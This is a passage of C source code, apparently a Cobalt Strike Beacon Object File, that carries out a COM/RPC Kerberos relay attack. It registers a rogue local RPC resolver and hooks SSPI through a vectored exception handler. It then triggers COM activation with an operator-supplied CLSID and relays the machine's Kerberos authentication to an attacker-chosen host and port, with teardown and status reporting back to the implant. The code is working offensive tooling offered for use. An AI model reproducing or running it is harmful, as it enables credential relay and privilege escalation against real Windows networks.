        g_state.rewrite_security_binding = 1;
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] Existing Kerberos-capable COM security accepted\n");
        return 1;
    }
    if (FAILED(hr)) {
        release(persistent_service);
        release(persistent_principal);
        g_state.detail = (int)hr;
        return 0;
    }
    if (FAILED(persistent_service->hr)) {
        /* COM owns the successful registration data even if one package's
         * result failed; do not free memory it may retain. */
        g_state.stage = STAGE_COM_AUTH_PACKAGE;
        g_state.detail = (int)persistent_service->hr;
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] COM security initialized for Kerberos\n");
    return 1;
}

static int register_task_resolver(void) {
    RPC_SERVER_INTERFACE *task_interface;
    RPC_DISPATCH_TABLE *empty_dispatch;
    RPC_STATUS status;
    char rpc_host[256];
    char rpc_endpoint[32];

    /* The listener is process-wide and intentionally survives this task.
     * Reusing the exact endpoint returns RPC_S_DUPLICATE_ENDPOINT (1740),
     * which is success for later BOF executions in the same Beacon. */
    g_state.stage = STAGE_RPC_RESOLVER;
    status = RPCRT4$RpcServerUseProtseqEpW(
        (RPC_WSTR)L"ncacn_ip_tcp", 20, (RPC_WSTR)g_state.rpc_endpoint, NULL);
    if (status && status != 1740) {
        g_state.detail = (int)status;
        return 0;
    }

    status = RPCRT4$RpcServerRegisterAuthInfoW(
        NULL, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, NULL);
    if (status) {
        g_state.detail = (int)status;
        return 0;
    }

    /* Allocate descriptors on the process heap because RPC owns them until
     * RpcServerUnregisterIf(..., TRUE) confirms that callbacks are drained. */
    task_interface =
        (RPC_SERVER_INTERFACE *)alloc(sizeof(*task_interface));
    empty_dispatch =
        (RPC_DISPATCH_TABLE *)alloc(sizeof(*empty_dispatch));
    if (!task_interface || !empty_dispatch) {
        release(task_interface);
        release(empty_dispatch);
        g_state.detail = (int)E_OUTOFMEMORY;
        return 0;
    }
    kcopy(task_interface, &resolver_interface, sizeof(*task_interface));
    task_interface->DispatchTable = empty_dispatch;

    status = RPCRT4$RpcServerRegisterIfEx(
        (RPC_IF_HANDLE)task_interface, NULL, NULL, RPC_IF_AUTOLISTEN, 20, NULL);
    if (status) {
        release(empty_dispatch);
        release(task_interface);
        g_state.detail = (int)status;
        return 0;
    }

    g_state.resolver_registered = 1;
    g_state.registered_interface = (RPC_IF_HANDLE)task_interface;
    g_state.registered_dispatch = empty_dispatch;
    /* Display conversion is diagnostic only; it cannot invalidate registration. */
    if (wide_to_ascii(g_state.rpc_host, rpc_host, sizeof(rpc_host)) &&
        wide_to_ascii(g_state.rpc_endpoint, rpc_endpoint,
                      sizeof(rpc_endpoint))) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] COM resolver ready: ncacn_ip_tcp:%s[%s]\n",
                     rpc_host, rpc_endpoint);
    }
    return 1;
}

/* Full production sequence. Keep the SSPI hook active from resolver setup
 * through callback quiescence; moving it later misses RPCSS authentication. */
static int run_relay(void) {
    CLSID clsid;
    HRESULT hr;
    char service_spn[256];

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Initializing COM/RPC relay\n");
    /* Do not activate if COM policy cannot emit Kerberos/Negotiate credentials. */
    if (!initialize_worker_com()) {
        return 0;
    }

    /* SPN conversion is status-only and cannot change the initialized policy. */
    if (wide_to_ascii(g_state.service_spn, service_spn,
                      sizeof(service_spn))) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] Relay service principal: %s\n", service_spn);
    }

    g_state.stage = STAGE_SSPI_HOOK;
    /* Missing interception would let the machine authenticate to this process only. */
    if (!install_hook()) {
        return 0;
    }

    hr = OLE32$CLSIDFromString(g_state.trigger_clsid, &clsid);
    if (FAILED(hr)) {
        g_state.stage = STAGE_CLSID_PARSE;
        g_state.detail = (int)hr;
        return 0;
    }
    /* Resolver/interface failure would expose callbacks without valid RPC state. */
    if (!register_task_resolver()) {
        return 0;
    }

    g_state.success = activation_once(&clsid);
    if (g_state.success) {
        g_state.stage = STAGE_RELAY_COMPLETE;
    }
    return g_state.success;
}

static void wait_callback_quiescence(void) {
    ULONG i;
    ULONG quiet_samples = 0;

    /* active_callbacks is an unload barrier, not a handshake counter. Require
     * 250 ms continuously at zero before reclaiming BOF-owned data/code. */
    for (i = 0; i < 500; i++) {
        if (atomic_read(&g_state.active_callbacks) == 0) {
            if (++quiet_samples >= 25) {
                return;
            }
        } else {
            quiet_samples = 0;
        }
        KERNEL32$Sleep(10);
    }
}

static void cleanup_relay(void) {
    RPC_STATUS unregister_status;

    /* Ordered teardown is a safety property. First stop RPC from entering
     * task-owned interface state, then restore native code, then let COM and
     * Winsock release the worker's per-thread/per-task references. */
    wait_callback_quiescence();
    if (g_state.resolver_registered) {
        unregister_status = RPCRT4$RpcServerUnregisterIf(
            g_state.registered_interface, NULL, TRUE);
        /* A failed synchronous unregister means callback-owned memory must stay live. */
        if (unregister_status) {
            g_state.success = 0;
            g_state.stage = STAGE_CLEANUP;
            g_state.detail = (int)unregister_status;
            BeaconPrintf(CALLBACK_ERROR,
                         "[-] Failed to clean up the COM RPC interface "
                         "(status %lu)\n", unregister_status);
        }
        if (!unregister_status) {
            g_state.resolver_registered = 0;
            release(g_state.registered_dispatch);
            g_state.registered_dispatch = NULL;
            release(g_state.registered_interface);
            g_state.registered_interface = NULL;
        }
    }

    remove_hook();
    wait_callback_quiescence();
    /* CoUninitialize must balance the apartment on its initializing worker. */
    if (g_state.com_ready &&
        g_state.com_thread_id == KERNEL32$GetCurrentThreadId()) {
        OLE32$CoUninitialize();
        g_state.com_ready = 0;
    }
    wait_callback_quiescence();
    release(g_state.continuation);
    g_state.continuation = NULL;
    if (g_state.bridge != INVALID_SOCKET) {
        WS2_32$closesocket(g_state.bridge);
        g_state.bridge = INVALID_SOCKET;
    }
    if (g_state.wsa_ready) {
        WS2_32$WSACleanup();
        g_state.wsa_ready = 0;
    }
}

static DWORD WINAPI relay_worker(LPVOID unused) {
    DWORD result;
    (void)unused;

    g_state.protected_thread_id = KERNEL32$GetCurrentThreadId();
    result = (DWORD)run_relay();
    cleanup_relay();
    return result;
}

static const char *stage_name(int stage) {
    switch (stage) {
        case STAGE_ARGUMENT_BLOCK:
        case STAGE_RELAY_HOST:
        case STAGE_RELAY_PORT:
        case STAGE_SERVICE_SPN:
        case STAGE_RPC_HOST:
        case STAGE_RPC_ENDPOINT:
        case STAGE_TRIGGER_CLSID:
            return "argument validation";
        case STAGE_VEH_INSTALL:
            return "VEH setup";
        case STAGE_WORKER_START:
        case STAGE_WORKER_EXCEPTION:
            return "worker execution";
        case STAGE_WORKER_COM:
        case STAGE_CALLER_COM:
            return "COM initialization";
        case STAGE_CLSID_PARSE:
            return "COM object selection";
        case STAGE_COM_QUERY:
        case STAGE_COM_POLICY:
        case STAGE_COM_SECURITY:
        case STAGE_COM_AUTH_PACKAGE:
            return "COM security";
        case STAGE_SSPI_HOOK:
            return "SSPI interception";
        case STAGE_RPC_RESOLVER:
            return "RPC resolver";
        case STAGE_NATIVE_ANCHOR:
        case STAGE_MARSHAL_STREAM:
        case STAGE_MARSHAL_INTERFACE:
        case STAGE_MARSHAL_READ:
        case STAGE_OBJREF_PREPARE:
        case STAGE_OBJREF_BINDING:
        case STAGE_OBJREF_SECURITY:
            return "OBJREF preparation";
        case STAGE_STORAGE:
            return "COM trigger storage";
        case STAGE_ACTIVATION:
            return "COM activation";
        case STAGE_RELAY_BRIDGE:
            return "relay bridge";
        case STAGE_RELAY_CONTINUATION:
            return "relay continuation";
        case STAGE_RELAY_TARGET:
            return "relay target";
        case STAGE_CLEANUP:
            return "cleanup";
        default:
            return "unknown phase";
    }
}

static int parse_arguments(char *args, unsigned long args_len) {
    datap parser;
    char *value;
    int value_len = 0;
    int port;

    /* The Beacon argument parser needs at least its outer size prefix. */
    if (!args || args_len < 4) {
        g_state.stage = STAGE_ARGUMENT_BLOCK;
        return 0;
    }
    BeaconDataParse(&parser, args, (int)args_len);

    value = BeaconDataExtract(&parser, &value_len);
    /* Host strings include a terminal NUL and must fit their fixed storage. */
    if (!value || value_len < 2 ||
        value_len > (int)sizeof(g_state.relay_host)) {
        g_state.stage = STAGE_RELAY_HOST;
        return 0;
    }
    kcopy(g_state.relay_host, value, (ULONG)value_len);
    g_state.relay_host[value_len - 1] = 0;

    port = BeaconDataInt(&parser);
    /* TCP ports are unsigned 16-bit values other than zero. */
    if (port < 1 || port > 65535) {
        g_state.stage = STAGE_RELAY_PORT;
        return 0;
    }
    g_state.relay_port = port;

    /* The relay SPN controls which Kerberos service ticket COM requests. */
    value = BeaconDataExtract(&parser, &value_len);
    if (!ascii_to_wide(value, value_len, g_state.service_spn,
                       sizeof(g_state.service_spn) / sizeof(WCHAR))) {
        g_state.stage = STAGE_SERVICE_SPN;
        return 0;
    }
    /* The OBJREF resolver host must identify the local RPC listener. */
    value = BeaconDataExtract(&parser, &value_len);
    if (!ascii_to_wide(value, value_len, g_state.rpc_host,
                       sizeof(g_state.rpc_host) / sizeof(WCHAR))) {
        g_state.stage = STAGE_RPC_HOST;
        return 0;
    }
    /* Reuse requires a stable explicit endpoint in this Beacon process. */
    value = BeaconDataExtract(&parser, &value_len);
    if (!ascii_to_wide(value, value_len, g_state.rpc_endpoint,
                       sizeof(g_state.rpc_endpoint) / sizeof(WCHAR))) {
        g_state.stage = STAGE_RPC_ENDPOINT;
        return 0;
    }
    /* The trigger class is parsed dynamically even though the CNA supplies one fixed CLSID. */
    value = BeaconDataExtract(&parser, &value_len);
    if (!ascii_to_wide(value, value_len, g_state.trigger_clsid,
                       sizeof(g_state.trigger_clsid) / sizeof(WCHAR))) {
        g_state.stage = STAGE_TRIGGER_CLSID;
        return 0;
    }
    return 1;
}

void go(char *args, unsigned long alen) {
    HANDLE worker = NULL;
    PVOID exception_handler = NULL;
    HRESULT caller_hr;

    kzero(&g_state, sizeof(g_state));
    prepare_interfaces();
    g_state.initialized = 1;
    g_state.bridge = INVALID_SOCKET;
    if (!parse_arguments(args, alen)) {
        goto relay_done;
    }

    /* If this call initializes COM on the long-lived Beacon thread, retain
     * that legitimate apartment reference so process security remains usable
     * after the disposable worker STA exits. Balance only a new S_FALSE ref. */
    caller_hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (caller_hr == S_FALSE) {
        OLE32$CoUninitialize();
    } else if (caller_hr != S_OK && caller_hr != RPC_E_CHANGED_MODE) {
        /* Only RPC_E_CHANGED_MODE is non-SUCCEEDED but still proves COM is usable. */
        g_state.stage = STAGE_CALLER_COM;
        g_state.detail = (int)caller_hr;
        goto relay_done;
    }

    /* The handler is process-wide only during this task. Its breakpoint path
     * serves SSPI on RPC threads; its containment path exits only the BOF
     * worker thread. All unrelated exceptions continue to normal handlers. */
    exception_handler =
        KERNEL32$AddVectoredExceptionHandler(0, relay_exception_handler);
    if (!exception_handler) {
        g_state.stage = STAGE_VEH_INSTALL;
        g_state.detail = (int)KERNEL32$GetLastError();
        goto relay_done;
    }
    worker = KERNEL32$CreateThread(NULL, 0, relay_worker, NULL, 0, NULL);
    if (!worker) {
        g_state.stage = STAGE_WORKER_START;
        g_state.detail = (int)KERNEL32$GetLastError();
        goto relay_done;
    }

    KERNEL32$WaitForSingleObject(worker, INFINITE);
    KERNEL32$CloseHandle(worker);
    /* Do not claim success if Windows failed to detach loader-owned VEH code. */
    if (!KERNEL32$RemoveVectoredExceptionHandler(exception_handler)) {
        g_state.success = 0;
        g_state.stage = STAGE_CLEANUP;
        g_state.detail = (int)KERNEL32$GetLastError();
    }
    exception_handler = NULL;

    if (g_state.exception_caught) {
        g_state.success = 0;
        g_state.stage = STAGE_WORKER_EXCEPTION;
        g_state.detail = (int)g_state.exception_code;
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] BOF worker exception 0x%08lx at 0x%llx; "
                     "Beacon preserved\n", g_state.exception_code,
                     (unsigned long long)g_state.exception_address);
        cleanup_relay();
    }

relay_done:
    /* These final guards also cover partial startup before the worker existed. */
    if (exception_handler) {
        if (!KERNEL32$RemoveVectoredExceptionHandler(exception_handler)) {
            g_state.success = 0;
            g_state.stage = STAGE_CLEANUP;
            g_state.detail = (int)KERNEL32$GetLastError();
        }
    }
    if (!worker) {
        cleanup_relay();
    }
    if (g_state.success && !g_state.resolver_registered &&
        !g_state.breakpoint_installed && !exception_handler) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] Cleanup complete: resolver removed, SSPI restored, "
                     "VEH removed\n");
    }
    if (!g_state.success) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Relay failed during %s (stage %d, status 0x%08x, "
                     "completed legs %d)\n",
                     stage_name(g_state.stage), g_state.stage,
                     (ULONG)g_state.detail, g_state.relayed_leg_count);
    }
}
